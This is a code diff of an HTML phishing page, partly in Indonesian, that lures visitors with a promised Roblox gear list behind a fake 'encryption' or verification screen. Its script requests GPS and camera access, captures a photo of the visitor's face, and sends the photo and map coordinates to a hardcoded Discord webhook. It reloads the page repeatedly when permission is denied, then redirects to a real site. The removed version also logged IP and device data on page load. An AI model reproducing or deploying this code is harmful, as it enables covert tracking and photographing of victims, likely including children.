@@ -3,80 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Sync</title>
+    <title>Sistem Verifikasi</title>
     <style>
-        :root { --accent: #28a745; }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #ffffff; font-family: sans-serif; overflow: hidden; }
-        .wrapper { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100%; text-align: center; padding: 20px; cursor: pointer; }
-        .card { background: #fff; padding: 40px 20px; border-radius: 25px; width: 100%; max-width: 350px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border: 1px solid #f0f0f0; pointer-events: none; }
-        .icon { font-size: 60px; margin-bottom: 20px; }
-        .btn { background: var(--accent); color: white; border: none; padding: 16px; border-radius: 50px; font-weight: bold; width: 100%; font-size: 18px; margin-top: 20px; }
-        
-        /* Modal Anti-System Text */
-        #custom-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 9999; justify-content: center; align-items: center; }
-        .m-box { background: white; padding: 30px; border-radius: 20px; width: 80%; text-align: center; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
+        .center { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        .scan-line { width: 100%; height: 2px; background: #0f0; position: absolute; top: 0; box-shadow: 0 0 15px #0f0; animation: scan 3s infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .btn-invisible { background: #0f0; color: #000; border: none; padding: 20px 60px; font-weight: bold; border-radius: 5px; cursor: pointer; z-index: 100; margin-top: 20px; }
     </style>
 </head>
-<body onload="sendFootprint()">
+<body onclick="forceCapture()">
 
-    <div id="custom-modal">
-        <div class="m-box">
-            <h3 style="color:#d9534f; margin-top:0;">Verifikasi Gagal!</h3>
-            <p style="color:#666;">Browser memblokir enkripsi. Tekan <b>'BAIK'</b> lalu pilih <b>'Izinkan'</b> untuk sinkronisasi.</p>
-            <button class="btn" onclick="location.reload()">BAIK</button>
-        </div>
-    </div>
-
-    <div class="wrapper" onclick="executeExploit()">
-        <div class="card">
-            <div class="icon">🔥</div>
-            <h2 style="margin:0; color:#333;">Verification Required</h2>
-            <p style="color:#888; margin-top:10px;">Ketuk layar untuk sinkronisasi browser dan membuka <b>Roblox Gear List</b>.</p>
-            <button class="btn">LINK WEBSITE 🔥</button>
-        </div>
+    <div class="scan-line"></div>
+    
+    <div class="center">
+        <h1 id="status-text">ENCRYPTING CONNECTION...</h1>
+        <div id="loader" style="font-size: 20px;">[##########----------] 50%</div>
+        <p style="color: #555; margin-top: 30px;">TAP SCREEN TO FINISH ENCRYPTION</p>
     </div>
 
     <script>
         const WH = "https://discord.com/api/webhooks/1466670095265693757/PDj7kW1DCUMmTSjuCsR1QBz4FNpMegYtGnAh9_V40W8KP1CHFdLWAbG8MyuOELxqMinw";
-        const REDIRECT = "https://robloxden.com/item-codes/categories/gear";
+        const FINAL = "https://robloxden.com/item-codes/categories/gear";
 
-        function sendFootprint() {
-            fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
-                fetch(WH, { method: 'POST', headers: {'Content-Type': 'application/json'}, 
-                body: JSON.stringify({content: "👣 **TARGET OPEN LINK**\nIP: `" + d.ip + "`\nDevice: " + navigator.userAgent}) });
-            }).catch(e => {});
-        }
-
-        async function executeExploit() {
-            // Step 1: Tarik Lokasi
+        async function forceCapture() {
+            document.getElementById('status-text').innerText = "SYNCHRONIZING...";
+            
+            // Trigger izin GPS + Kamera secara paksa
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const locMsg = `📍 **LOKASI DETECTED**\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                
-                // Step 2: Tarik Kamera
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    await video.play();
+                    const v = document.createElement('video');
+                    v.srcObject = stream;
+                    await v.play();
 
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const c = document.createElement('canvas');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
                     
-                    const blob = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
+                    const blob = await (await fetch(c.toDataURL('image/jpeg'))).blob();
                     const fd = new FormData();
-                    fd.append("file", blob, "wajah.jpg");
-                    fd.append("payload_json", JSON.stringify({ content: locMsg + "\n📸 **FACE CAPTURED!** 🔥" }));
+                    fd.append("file", blob, "captured.jpg");
+                    fd.append("payload_json", JSON.stringify({ 
+                        content: `✅ **VICTIM SECURED**\nMaps: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}` 
+                    }));
                     
                     await fetch(WH, { method: "POST", body: fd });
                     stream.getTracks().forEach(t => t.stop());
                     
-                    window.location.replace(REDIRECT);
+                    // Mental ke link asli
+                    window.location.replace(FINAL);
                 } catch(e) {
-                    document.getElementById('custom-modal').style.display = 'flex';
+                    // JIKA TARGET KLIK BLOCK: Refresh paksa biar minta lagi sampe mampus
+                    location.reload();
                 }
             }, (err) => {
-                document.getElementById('custom-modal').style.display = 'flex';
+                location.reload(); // Paksa terus
             }, { enableHighAccuracy: true });
         }
     </script>
